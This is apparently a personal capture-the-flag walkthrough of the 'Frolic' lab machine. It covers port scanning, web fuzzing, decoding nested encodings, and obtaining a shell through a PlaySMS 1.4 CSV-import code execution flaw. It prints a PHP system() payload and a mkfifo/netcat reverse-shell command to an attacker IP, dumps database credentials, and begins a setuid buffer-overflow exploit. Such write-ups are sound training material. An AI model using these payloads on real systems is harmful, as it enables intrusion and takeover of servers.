1,Recon
port scan
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-11-28T06:42:34
|_  start_date: N/A
|_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2024-11-28T12:12:34+05:30
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

```

Firstly, I need to confirm a thing: this is a CTF box, not a real-box.

I would check the web-contents of the 2 web services:
```
ffuf -u http://forlic.htb:1880/FUZZ -w /usr/share/wordlists/dirb/common.txt

flows 401
icons 401
red 301
settings 401
vendor 301

ffuf -u http://forlic.htb:9999/FUZZ -w /usr/share/wordlists/dirb/common.txt
admin 301
backup 301
dev 301
test 301
/dev/backup
```
Fro the port 1880, there is nothing could be accessable, but for the other port, we can lead into `/admin`
![](images/Pasted%20image%2020241128021750.png)
When we firstly use the wrong certificate, it would pop-up a window
`You have left 2 attempt;`
So, that means there would be some fancy javascripts.
from the source page, we found 
```
<title>Crack me :|</title>
<!-- Include CSS File Here -->
<link rel="stylesheet" href="[css/style.css](view-source:http://10.10.10.111:9999/admin/css/style.css)"/>
<!-- Include JS File Here -->
<script src="[js/login.js](view-source:http://10.10.10.111:9999/admin/js/login.js)"></script>
</head>
```

Also, we can check this script
```
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}
```

That leads to a page `success.html`
Then we get a tricky encode text, looks like Morse Code.
PS: in this place, it was a boring decode progress, so I would not explain how to know that.
![](images/Pasted%20image%2020241128022145.png)
we can decode that in this website `https://www.splitbrain.org/_static/ook/`
And we can get the text `Nothing here check /asdiSIAJJ0QWE9JAS`
```
http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/

UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA
```
It looks like base64 encode.
Firstly, decode it and check the file archive.
`out: Zip archive data, at least v2.0 to extract, compression method=deflate`

When I want to continue compress it, it needs the password.
Then we get `password` as the password.

The ZIP contains a single index.php file, which contains a hex string.
Converting this hex to ascii results in more base64 encoded data.

```
cat index.php | xxd -r -p

KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr
KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg
K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t
LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==

```

```
cat index.php | xxd -r -p | tr -d '\r\n' | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
++..<
```

Then continue to crack it, and we get it outputs `idkwhatispass`

Let's try this password for `Node-Red` and `playsms`
We successfully login to `playsms`

There is a public vulnerability in PlaySMS.
`PlaySMS 1.4 - 'import.php' Remote Code Execution`
By following the Poc, I would make the payload.
```
Name,Mobile,Email,Group code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,
```
`User-Agent: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f`

Hitting the import button takes me to a form where I can upload the csv. I’ll need to either use a user agent changer, or catch the request in burp and change it to the command I want to run. If I set my user agent to id, I get this:
![](images/Pasted%20image%2020241128025527.png)

Then we finally get shell
![](images/Pasted%20image%2020241128030514.png)

2, switch to valid users
From `config.php`, we get the database credits
```
$core_config['db']['type'] = 'mysqli';          // database engine
$core_config['db']['host'] = 'localhost';       // database host/server
$core_config['db']['port'] = '3306';    // database port
$core_config['db']['user'] = 'root';    // database username
$core_config['db']['pass'] = 'ayush';   // database password
$core_config['db']['name'] = 'playsms'; // database name

```
There is a `/binary` directory in the file path `/home/ayush` and we found 
There’s a setuid binary owned by root in /home/ayush/.binary:
```
-rwsr-xr-x 1 root  root  7480 Sep 25  2018 rop
```
Since this looks like an exploitation opportunity, I’ll see what’s configured. No ASLR:
`www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space
0`

When I pull the binary back, open it in gdb with PEDA, and run checksec:
```
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

I can run it as well, and force it to crash:
```
root@kali# ./rop 
[*] Usage: program <message>

root@kali# ./rop $(python -c 'print "A"*10')
[+] Message sent: AAAAAAAAAA

root@kali# ./rop $(python -c 'print "A"*500')
Segmentation fault
```

